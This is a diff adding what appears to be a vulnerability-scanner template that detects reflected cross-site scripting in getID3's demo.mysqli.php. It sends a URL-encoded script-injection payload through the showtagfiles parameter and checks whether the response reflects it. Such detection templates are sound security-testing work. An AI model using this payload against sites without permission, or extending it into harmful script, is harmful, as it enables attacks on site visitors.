@@ -1,0 +1,30 @@
+id: xss-getID
+
+info:
+  name: XSS alphabet
+  author: osamahamad
+  severity: medium
+  description: Cross-site scripting (XSS) on https://github.com/JamesHeinrich/getID3/issues/341
+  tags: xss,discourse
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/getID3/demos/demo.mysqli.php?encoderoptionsdistribution=1&showtagfiles=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E'
+      - '{{BaseURL}}/demos/demo.mysqli.php?encoderoptionsdistribution=1&showtagfiles=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E'
+    
+    
+    redirects: true
+    max-redirects: 1
+    matchers-condition: and
+    matchers:
+
+      - type: word
+        words:
+          - '"/><script>alert(1)</script>'
+        part: body
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
